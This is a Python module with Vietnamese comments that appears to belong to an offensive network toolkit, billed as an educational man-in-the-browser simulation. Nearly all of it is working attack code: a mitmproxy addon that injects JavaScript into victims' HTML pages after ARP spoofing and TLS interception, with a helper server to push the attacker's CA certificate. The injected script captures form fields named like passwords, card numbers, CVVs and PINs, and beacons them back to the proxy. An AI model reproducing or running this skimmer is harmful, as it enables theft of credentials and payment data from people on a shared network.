#!/usr/bin/env python3
"""
Man-in-the-Browser (MitB) Attack Simulation Module
Sử dụng MitM để tiêm JavaScript vào các trang web của nạn nhân.
*** CẢNH BÁO: CHỈ SỬ DỤNG CHO MỤC ĐÍCH GIÁO DỤC VÀ NGHIÊN CỨU. ***
"""

import os
import time
import logging
import shutil
import sys
from typing import Optional
from colorama import Fore, Style

# --- Path Fix for mitmproxy ---
# When mitmproxy runs this script with -s, it loses the package context.
# This adds the project root to the path to allow absolute imports.
project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
if project_root not in sys.path:
    sys.path.insert(0, project_root)

# Import các thành phần cần thiết từ module mitm
from modules.mitm import MitmAttacker
from modules import utils

# Import các thành phần của mitmproxy
from mitmproxy import http, ctx

# --- JavaScript Payload ---
# Đoạn mã này sẽ được tiêm vào các trang web của nạn nhân.
JS_PAYLOAD = """
(function() {
    'use strict';
    console.log('[MitB] Payload Injected! Connection is being monitored.');

    // 1. Hiển thị một banner cảnh báo trên đầu trang
    function showSecurityBanner() {
        const banner = document.createElement('div');
        banner.innerHTML = '🔥 <b>SYSTEM WARNING</b>: This connection is being actively monitored for security analysis purposes. 🔥';
        banner.style.backgroundColor = '#ffc107';
        banner.style.color = 'black';
        banner.style.padding = '10px';
        banner.style.textAlign = 'center';
        banner.style.fontSize = '14px';
        banner.style.fontWeight = 'bold';
        banner.style.position = 'fixed';
        banner.style.top = '0';
        banner.style.left = '0';
        banner.style.width = '100%';
        banner.style.zIndex = '9999';
        document.body.prepend(banner);
        // Đẩy nội dung trang xuống để không bị che
        document.body.style.paddingTop = banner.offsetHeight + 'px';
    }

    // 2. Bắt sự kiện gửi form để đánh cắp dữ liệu
    function interceptFormSubmissions() {
        document.querySelectorAll('form').forEach(form => {
            form.addEventListener('submit', function(e) {
                const formData = new FormData(form);
                const capturedData = {};
                let hasSensitiveData = false;

                for (let [key, value] of formData.entries()) {
                    const lowerKey = key.toLowerCase();
                    // Tìm các trường nhạy cảm
                    if (lowerKey.includes('pass') || lowerKey.includes('card') || lowerKey.includes('cvv') || lowerKey.includes('secret') || lowerKey.includes('pin')) {
                        capturedData[key] = value;
                        hasSensitiveData = true;
                    }
                }

                if (hasSensitiveData) {
                    console.warn('[MitB] Captured sensitive form data:', capturedData);
                    // Gửi dữ liệu bị đánh cắp về cho attacker qua một "beacon"
                    // Attacker sẽ thấy log này trong console của mitmproxy
                    fetch('/mitb-beacon', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            page_url: window.location.href,
                            form_action: form.action,
                            captured_data: capturedData
                        })
                    }).catch(err => console.error('[MitB] Beacon failed:', err));
                }
            }, true); // Sử dụng capture phase để đảm bảo bắt được sự kiện
        });
    }

    // Chạy các hàm sau khi trang đã tải xong
    window.addEventListener('load', () => {
        showSecurityBanner();
        interceptFormSubmissions();
    });
})();
"""

# --- Mitmproxy Addon ---
class BrowserInjector:
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Hàm này được gọi cho mỗi response từ server về client.
        """
        # Chỉ tiêm vào các trang HTML
        content_type = flow.response.headers.get("content-type", "")
        if "text/html" in content_type:
            # Lấy nội dung HTML
            html = flow.response.get_text(strict=False)
            if html:
                # Tiêm payload ngay trước thẻ đóng </body>
                injection_point = html.rfind("</body>")
                if injection_point != -1:
                    injected_script = f"<script type='text/javascript'>{JS_PAYLOAD}</script>"
                    html = html[:injection_point] + injected_script + html[injection_point:]
                    flow.response.text = html
                    ctx.log.info(f"[MitB] Injected payload into: {flow.request.pretty_host}")

    def request(self, flow: http.HTTPFlow) -> None:
        """
        Hàm này được gọi cho mỗi request từ client lên server.
        """
        # Bắt các beacon gửi về từ JS payload
        if flow.request.path == "/mitb-beacon":
            beacon_data = flow.request.get_text()
            ctx.log.warn(f"{Fore.RED}[MitB] 🚨 CAPTURED SENSITIVE DATA 🚨\n{beacon_data}{Style.RESET_ALL}")
            # Trả về một response rỗng để hoàn thành request
            flow.response = http.Response.make(204)

# --- Runner Function ---
def run_mitb_attack(interface: str, **kwargs):
    """
    Hàm điều phối tấn công MitB.
    """
    try:
        print(f"\n{Fore.RED}=== MAN-IN-THE-BROWSER ATTACK SIMULATION ==={Style.RESET_ALL}")
        
        # Tạo một MitmAttacker giả để truy cập các hàm tiện ích
        dummy_attacker = MitmAttacker(interface, ["127.0.0.1"], "127.0.0.1")
        
        # Chọn nạn nhân và gateway
        all_targets = utils.load_targets_from_scan(dummy_attacker.logger, dummy_attacker.attacker_ip, exclude_router=False, exclude_attacker=True)
        if not all_targets:
            print(f"{Fore.RED}[-] Không tìm thấy thiết bị nào. Vui lòng chạy 'scan' trước.{Style.RESET_ALL}")
            return

        victim_targets = [t for t in all_targets if not t.endswith('.1')]
        victim_ips = dummy_attacker._select_targets_from_menu(victim_targets, "CHỌN NẠN NHÂN (VICTIM)")
        if not victim_ips:
            print("[-] Đã hủy tấn công.")
            return

        gateway_targets = [t for t in all_targets if t not in victim_ips]
        gateway_ip = dummy_attacker._select_targets_from_menu(gateway_targets, "CHỌN GATEWAY (ROUTER)")[0]
        if not gateway_ip:
            print("[-] Đã hủy tấn công.")
            return

        print(f"\n{Fore.YELLOW}[!] Tấn công MitB yêu cầu SSL Interception để hoạt động.")
        print(f"[!] Nạn nhân PHẢI cài đặt chứng chỉ CA của mitmproxy để tránh lỗi kết nối.{Style.RESET_ALL}")
        
        cert_server_choice = input("[?] Bạn có muốn khởi động web server để hỗ trợ gửi chứng chỉ CA cho nạn nhân không? (Y/n): ").lower()
        start_cert_server = cert_server_choice != 'n'

        # Khởi tạo MitmAttacker thật sự
        # Bắt buộc bật SSL Interception và chỉ định script addon là file này
        attacker = MitmAttacker(interface, victim_ips, gateway_ip, 
                                enable_ssl_interception=True, **kwargs)
        
        # Ghi đè đường dẫn script của mitmproxy để trỏ đến chính file này
        attacker.mitmproxy_script_path = __file__

        if start_cert_server:
            attacker._start_ca_delivery_server(attacker.attacker_ip)

        if attacker.start_attack():
            try:
                while attacker.is_attacking():
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n[*] Người dùng yêu cầu dừng...")
        
        attacker.stop_attack()

    except KeyboardInterrupt:
        print("\n[*] Hủy tấn công.")
    except Exception as e:
        logging.error(f"Lỗi không mong muốn trong MitB: {e}", exc_info=True)